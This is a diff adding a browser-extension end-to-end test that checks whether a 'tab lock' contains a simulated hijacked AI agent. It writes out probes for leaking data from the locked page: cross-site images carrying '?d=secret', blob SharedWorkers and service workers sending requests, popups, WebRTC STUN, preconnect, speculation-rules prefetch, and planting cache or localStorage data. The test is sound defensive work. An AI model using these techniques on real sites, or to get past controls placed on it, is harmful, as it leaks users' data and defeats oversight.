@@ -1175,6 +1175,7 @@ class Scenario {
       await r.check('sandboxed mods in the panel: their own group between Rules and Page scripts, with its switch (off on the site: they stop there; on: back), and "New mods start" has a Sandboxed row', () => this.sandboxedPanelCheck(win));
       await r.check('Settings → New mods start → Page scripts Off: a new page script arrives off, marked "new", and doesn\'t run; a new rules mod runs; switched on in the panel, it runs; Page scripts On again', () => this.startsOffCheck(win));
       await r.check('a hijacked agent (a stand-in Claude Code): the tab it ran code in sends nothing that changes anything until it reloads, even later; its mod that posts is held by its code, whatever its header says', () => this.hijackedAgentCheck(win));
+      await r.check('the tab lock\'s harder edges (TL-1 to TL-6): cross-site images, workers no tab owns, the site\'s other tabs, popups, WebRTC and preconnect from the locked page, and what the code leaves in the site\'s storage', () => this.tabLockHardeningCheck(win));
     }
 
     if (this.o.agent) await this.agentChecks('claude');
@@ -2627,6 +2628,241 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
     }
   }
 
+  // ---- the tab lock's harder edges (docs/TABLOCK-AUDIT.md TL-1 to TL-6, extension/tablock.js)
+
+  /**
+   * Locks a tab with a stand-in side-panel agent (one `trif run`, which also puts in the page's leak
+   * guard), then tries what the audit suspected from the locked page, with terminal `trif run`s (the
+   * user's own: they don't lock, but the lock's rules apply to them) and page code with user activation
+   * (for popups): a cross-site image (TL-1), a SharedWorker from a blob: URL and a service worker sending
+   * for the page (TL-2), another tab of the site posting (TL-4), popups to another site (TL-5), WebRTC and
+   * preconnect (TL-6), and what the code leaves in the site's storage (TL-3). Each item is "open" if
+   * anything got through. Everything is tried, then the open ones fail the check together.
+   */
+  async tabLockHardeningCheck(win) {
+    const dir = path.join(this.work, 'standin-harden');
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
+const { spawnSync } = require('child_process');
+const fs = require('fs');
+const a = process.argv.slice(2);
+if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
+if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
+const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
+say({ type: 'system', subtype: 'init', session_id: 'e2e-harden' });
+const ctxFile = a[a.indexOf('--append-system-prompt-file') + 1];
+const ctx = a.includes('--append-system-prompt-file') ? fs.readFileSync(ctxFile, 'utf8') : a.join(' ');
+const tab = (/\\(tab (\\d+)\\)/.exec(ctx) || [])[1];
+const own = require('path').join(process.cwd(), 'bin', 'trif');
+const r = spawnSync(fs.existsSync(own) ? own : 'trif', ['run', '--tab', tab, '--timeout', '8000', '"locked"'], { encoding: 'utf8' });
+const text = JSON.stringify({ tab, ran: r.status === 0 ? r.stdout.trim() : 'trif failed: ' + String(r.stderr || r.stdout).trim() });
+say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text }] } });
+say({ type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'e2e-harden' });
+`, { mode: 0o755 });
+    const cfgFile = path.join(this.priv, 'config.json');
+    const saved = fs.readFileSync(cfgFile, 'utf8');
+    const cfg = JSON.parse(saved);
+    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
+    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
+    const site = '127.0.0.1';
+    const { port, tlsPort } = this.o.servers;
+    const base = `http://${site}:${port}`;
+    const other = `http://localhost:${port}`;
+    const cdn = `https://www.google.com:${tlsPort}`;
+    const reqs = (host, p) => this.o.servers.requests.filter((q) => q.host === host && q.url.startsWith(p));
+    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
+    const reopen = async () => {
+      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
+      await sleep(800);
+      this.panelCtx = await this.d.findPage('sidepanel.html');
+    };
+    const run = async (tab, code) => {
+      const x = await this.cli(['run', '--tab', String(tab), '--timeout', '9000', code], { timeoutMs: 30000 });
+      return x.status === 0 ? x.stdout.trim() : `error: ${String(x.stderr || x.stdout).trim().slice(0, 200)}`;
+    };
+    const lockNotice = () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? { text: n.innerText.trim(), buttons: [...n.querySelectorAll('button')].map((b) => b.textContent) } : null; }`);
+    const lockByAgent = async (what) => {
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
+      await reopen();
+      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
+      await this.waitLooks('Send on (the stand-in Claude Code)', (l) => /Claude Code/.test(l.dotLabel) && !l.send.disabled, 30000);
+      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [what]);
+      await this.d.click(this.panelCtx, '#send');
+      const c = await waitFor('the stand-in run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 60000, intervalMs: 300 });
+      const said = JSON.parse(c.messages.find((m) => m.role === 'assistant')?.text || '{}');
+      if (said.ran !== 'locked') throw new Error(`the stand-in's run: ${JSON.stringify(said)}`);
+      await waitFor('the lock notice', lockNotice, { timeoutMs: 10000 });
+    };
+    // Listeners for what isn't HTTP: STUN (UDP) and preconnect (a bare TCP connection), one port each
+    const dgram = require('dgram');
+    const net = require('net');
+    const udp = dgram.createSocket('udp4');
+    let stun = 0;
+    udp.on('message', () => { stun++; });
+    await new Promise((res) => udp.bind(0, '127.0.0.1', res));
+    const tcp = {};
+    const listen = (name) => new Promise((res) => {
+      const s = net.createServer((c) => { s.hits++; c.destroy(); });
+      s.hits = 0;
+      s.listen(0, '127.0.0.1', () => { tcp[name] = s; res(); });
+    });
+    for (const n of ['setter', 'attribute', 'html']) await listen(n);
+    const found = {}; // item -> [what got through]
+    const open = (id, what) => { (found[id] ||= []).push(what); };
+    const notes = [];
+    const extra = [];
+    this.hijacked = true;
+    this.hardened = true;
+    try {
+      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=harden`]);
+      await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
+      // Before the lock: the page loads an image from a "CDN" (TL-1: it may go on doing so)
+      await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r("loaded"); i.src = "${cdn}/e2e-cdn-1.png"; })`);
+      // Another tab of the site, open before the lock (TL-4)
+      const sib = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${base}/two.html?e2e=sibling`]);
+      await waitFor('the other tab', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [sib])) === 'complete' || null, { timeoutMs: 15000 });
+      // ---- lock 1
+      await lockByAgent('tidy the page');
+      const t0 = Date.now();
+      // TL-1: an image to another site; the CDN it already used still loads
+      await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r(1); i.src = "${other}/e2e-img-leak?d=secret"; })`);
+      await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r(1); i.src = "${cdn}/e2e-cdn-2.png"; })`);
+      // TL-2: a SharedWorker from a blob: URL, and the site's own service worker, sending for the page
+      const shared = await run(win.tabId, `new Promise((res) => {
+        const src = 'onconnect = (e) => { const p = e.ports[0]; p.onmessage = (m) => fetch(m.data.url, { method: m.data.method, body: m.data.method === "POST" ? "x" : undefined }).then((r) => p.postMessage("sent " + r.status), (x) => p.postMessage("blocked: " + x.message)); };';
+        const w = new SharedWorker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
+        const out = [];
+        w.port.onmessage = (m) => { out.push(m.data); if (out.length === 2) res(out.join(" / ")); };
+        w.port.postMessage({ url: "/e2e-shw-post", method: "POST" });
+        w.port.postMessage({ url: "${other}/e2e-shw-leak?d=secret", method: "GET" });
+        setTimeout(() => res(out.join(" / ") || "no answer"), 5000);
+      })`);
+      const worker = await run(win.tabId, `(async () => {
+        const reg = await navigator.serviceWorker.register("/e2e-sw.js");
+        await navigator.serviceWorker.ready;
+        const ask = (m) => new Promise((res) => { const ch = new MessageChannel(); ch.port1.onmessage = (e) => res(e.data); reg.active.postMessage(m, [ch.port2]); setTimeout(() => res("no answer"), 4000); });
+        return [await ask({ url: "/e2e-sw-post", method: "POST" }), await ask({ url: "${other}/e2e-sw-leak?d=secret", method: "GET" })].join(" / ");
+      })()`);
+      // TL-3 (the service worker above, and a cache entry): what the code leaves in the site's storage
+      const cached = await run(win.tabId, `(async () => { const c = await caches.open("e2e-poison"); await c.put("/e2e-cached", new Response("planted")); return "planted"; })()`);
+      // TL-4: the other tab of the site posts
+      const sibPost = await run(sib, 'fetch("/e2e-sib-post", { method: "POST", body: "x" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
+      const sibIcon = await this.toolbarIcon(sib);
+      // and a tab of the site opened now
+      const third = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${base}/three.html?e2e=third`]);
+      await sleep(1500);
+      const thirdIcon = await this.toolbarIcon(third);
+      // its panel: the other tab's notice
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [sib]);
+      await sleep(1200);
+      const sibNotice = await lockNotice().catch(() => null);
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
+      // TL-5: popups from the locked page to another site (with user activation, as a click would give)
+      const page = await this.d.findPage((u) => u.includes('e2e=harden'), { timeoutMs: 5000 });
+      const before = await this.ext('async () => (await chrome.tabs.query({})).map((t) => t.id)');
+      await this.d.eval(page, `async (o) => { window.open(o + "/e2e-popup-noopener?d=secret", "_blank", "noopener"); return true; }`, [other], { userActivation: true });
+      await this.d.eval(page, `async (o) => { window.open(o + "/e2e-popup-opener?d=secret"); return true; }`, [other], { userActivation: true });
+      await sleep(2500);
+      const popups = await this.ext('async (old) => (await chrome.tabs.query({})).filter((t) => !old.includes(t.id)).map((t) => ({ id: t.id, opener: t.openerTabId ?? null }))', [before]);
+      // a page the user opens in a new tab still loads (no initiator)
+      const typed = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${other}/e2e-typed`]);
+      await sleep(1500);
+      // TL-6: WebRTC (STUN to the UDP listener), straight and from a fresh iframe; preconnect three ways;
+      // speculation rules
+      const rtc = (iframe) => `(async () => { try {
+        let W = window;
+        if (${iframe}) { const f = document.createElement("iframe"); document.body.append(f); W = f.contentWindow; }
+        const pc = new W.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${udp.address().port}" }] });
+        pc.createDataChannel("x");
+        await pc.setLocalDescription(await pc.createOffer());
+        await new Promise((r) => setTimeout(r, 2500));
+        pc.close();
+        return "made";
+      } catch (e) { return "refused: " + e.message; } })()`;
+      const rtcMain = await run(win.tabId, rtc(false));
+      const stunMain = stun;
+      const rtcFrame = await run(win.tabId, rtc(true));
+      const stunFrame = stun - stunMain;
+      await run(win.tabId, `(() => { const l = document.createElement("link"); l.rel = "preconnect"; l.href = "http://127.0.0.1:${tcp.setter.address().port}"; document.head.append(l); return 1; })()`);
+      await run(win.tabId, `(() => { const l = document.createElement("link"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "http://127.0.0.1:${tcp.attribute.address().port}"); document.head.append(l); return 1; })()`);
+      await run(win.tabId, `(() => { document.head.insertAdjacentHTML("beforeend", '<link rel="preconnect" href="http://127.0.0.1:${tcp.html.address().port}">'); return 1; })()`);
+      const spec = await run(win.tabId, `new Promise((r) => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: ["${other}/e2e-spec?d=secret"] }] }); document.head.append(s); setTimeout(() => r(document.querySelector('script[type="speculationrules"]') ? "kept" : "taken out"), 800); })`);
+      await sleep(2500);
+      // What got through
+      if (reqs('localhost', '/e2e-img-leak').length) open('TL-1', 'a cross-site image reached the other site');
+      const cdnKept = reqs('www.google.com', '/e2e-cdn-2').length > 0;
+      if (reqs(site, '/e2e-shw-post').some((q) => q.method === 'POST')) open('TL-2', 'a blob: SharedWorker posted');
+      if (reqs('localhost', '/e2e-shw-leak').length) open('TL-2', 'a blob: SharedWorker reached another site');
+      if (reqs(site, '/e2e-sw-post').some((q) => q.method === 'POST')) open('TL-2', 'the service worker posted');
+      if (reqs('localhost', '/e2e-sw-leak').length) open('TL-2', 'the service worker reached another site');
+      if (reqs(site, '/e2e-sib-post').some((q) => q.method === 'POST')) open('TL-4', 'another tab of the site posted');
+      if (sibIcon !== 'robot-paused-16.png') open('TL-4', `the other tab's icon: ${sibIcon}`);
+      if (thirdIcon !== 'robot-paused-16.png') open('TL-4', `a tab of the site opened during the lock: icon ${thirdIcon}`);
+      if (!sibNotice) open('TL-4', "the other tab's panel: no notice");
+      if (reqs('localhost', '/e2e-popup-noopener').length) open('TL-5', 'a noopener popup reached another site');
+      if (reqs('localhost', '/e2e-popup-opener').length) open('TL-5', 'a popup (with opener) reached another site');
+      if (stunMain) open('TL-6', `WebRTC sent ${stunMain} STUN packet(s)`);
+      if (stunFrame) open('TL-6', `WebRTC from a fresh iframe sent ${stunFrame} STUN packet(s)`);
+      for (const [n, s] of Object.entries(tcp)) if (s.hits) open('TL-6', `preconnect (${n}) opened a connection`);
+      if (reqs('localhost', '/e2e-spec').length) open('TL-6', 'speculation rules prefetched another site');
+      extra.push(`typed URL in a new tab ${reqs('localhost', '/e2e-typed').length ? 'loaded' : 'DID NOT load'}`);
+      if (!reqs('localhost', '/e2e-typed').length) open('TL-5', 'a page the user opens in a new tab was blocked');
+      if (!cdnKept) open('TL-1', 'the CDN the page already used was blocked (the page would break)');
+      notes.push(`shared worker: ${shared}`, `service worker: ${worker}`, `other tab POST: ${sibPost}`, `popups: ${JSON.stringify(popups)}`,
+        `WebRTC: ${rtcMain}; from an iframe: ${rtcFrame}`, `speculation rules script: ${spec}`, `cache: ${cached}`, `lock-1 probes ${((Date.now() - t0) / 1000).toFixed(1)} s`);
+      for (const p of popups) await this.ext('async (id) => { await chrome.tabs.remove(id).catch(() => {}); }', [p.id]);
+      await this.ext('async (ids) => { for (const id of ids) await chrome.tabs.remove(id).catch(() => {}); }', [[typed, third]]);
+      // ---- unlock 1: the panel's Reload. The service worker and cache the code left: cleared (TL-3)
+      await this.panel(`async () => { [...document.querySelectorAll('#tab-lock button')].find((b) => /Reload/.test(b.textContent)).click(); return true; }`);
+      await waitFor('the tab unlocked', async () => (await lockNotice()) === null || null, { timeoutMs: 20000 });
+      await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
+      const left1 = await run(win.tabId, '(async () => ({ caches: await caches.keys(), workers: (await navigator.serviceWorker.getRegistrations()).length }))()');
+      if (/e2e-poison/.test(left1) || !/"workers":0/.test(left1)) open('TL-3', `after the unlocking reload, the site still had what the code left: ${left1}`);
+      notes.push(`after unlock 1: ${left1}`);
+      // the other tab: unlocked with it
+      const sibAfter = await this.toolbarIcon(sib);
+      const sibPost2 = await run(sib, 'fetch("/e2e-sib-post2", { method: "POST", body: "x" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
+      extra.push(`other tab after: icon ${sibAfter}, POST ${sibPost2}`);
+      if (sibAfter !== 'robot-16.png' || !/^sent/.test(sibPost2)) open('TL-4', `the other tab stayed locked after the first one unlocked: ${sibAfter}, ${sibPost2}`);
+      // ---- lock 2: the code leaves something in localStorage the site would render
+      await lockByAgent('tidy the page again');
+      await run(win.tabId, 'localStorage.setItem("e2e-poison", "<b>planted</b>"), "planted"');
+      await this.panel(`async () => { [...document.querySelectorAll('#tab-lock button')].find((b) => /Reload/.test(b.textContent)).click(); return true; }`);
+      // fixed: still locked, saying the site's saved data changed, with Reset and Keep; else: unlocked
+      const after2 = await waitFor('the tab unlocked, or a note on the saved data', async () => {
+        const n = await lockNotice();
+        return n === null ? { unlocked: true } : n.buttons.length > 1 ? n : null;
+      }, { timeoutMs: 20000 });
+      if (after2.unlocked) {
+        const ls = await run(win.tabId, 'localStorage.getItem("e2e-poison") || "gone"');
+        open('TL-3', `the tab unlocked with what the code left in localStorage: ${ls}`);
+      } else {
+        notes.push(`saved-data note: ${JSON.stringify(after2)}`);
+        await this.shot(this.panelCtx, 'panel-tablock-saved-data');
+        await this.panel(`async () => { [...document.querySelectorAll('#tab-lock button')].find((b) => /Reset/.test(b.textContent)).click(); return true; }`);
+        await waitFor('the tab unlocked after Reset', async () => (await lockNotice()) === null || null, { timeoutMs: 20000 });
+        await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
+        const ls = await run(win.tabId, 'localStorage.getItem("e2e-poison") || "gone"');
+        if (ls !== 'gone') open('TL-3', `Reset left localStorage: ${ls}`);
+        extra.push(`localStorage after Reset: ${ls}`);
+      }
+      await sleep(500);
+      await this.ext('async (id) => { await chrome.tabs.remove(id).catch(() => {}); }', [sib]);
+      const summary = `${extra.join('; ')}\n${notes.join('\n')}`;
+      fs.writeFileSync(this.r.file(`${this.label}-tablock-hardening.txt`), `${JSON.stringify(found, null, 2)}\n${summary}\n`);
+      const ids = Object.keys(found);
+      if (ids.length) throw new Error(`open: ${ids.map((k) => `${k}: ${found[k].join('; ')}`).join(' | ')}\n${summary}`);
+      return `all closed. ${summary.replace(/\n/g, '; ')}`;
+    } finally {
+      fs.writeFileSync(cfgFile, saved);
+      udp.close();
+      for (const s of Object.values(tcp)) s.close();
+      await run(win.tabId, '(async () => { localStorage.removeItem("e2e-poison"); for (const n of await caches.keys()) await caches.delete(n); for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister(); return 1; })()').catch(() => {});
+      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
+    }
+  }
+
   // ---- agent runs (real ones: they use your Claude Code / Codex login and cost a little)
 
   async agentChecks(agent) {
@@ -2780,6 +3016,8 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       // (the sandboxed mods' test page: its hostile mod's refusals and the errors the good one throws on purpose)
       // (Chrome names the page the tab had when its console was first attached, so by the text)
       || (this.sandboxPage && (/^\[TRIF\] 127\.0\.0\.1\/e2e-sbx-/.test(String(p.text)) || /willReadFrequently/.test(String(p.text)) || /\/sandbox\.html/.test(String(p.source || ''))))
+      // (the tab-lock edges: the probes the lock refuses, tabLockHardeningCheck)
+      || (this.hardened && /e2e-(img-leak|shw-|sw-|popup-|spec|cdn|sib-post)|e2e-sw\.js|RTCPeerConnection|TRIF paused|SharedWorker|ServiceWorker|speculation/i.test(String(p.text) + String(p.source || '')))
       || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket|e2e-leak|e2e-nav|blocked by|CORS/i.test(String(p.text) + String(p.source || '')));
     const problems = (await this.d.consoleProblems()).filter((p) => !expected(p));
     // The agent-made mod and the stand-in pages aren't ours to judge; everything else counts.
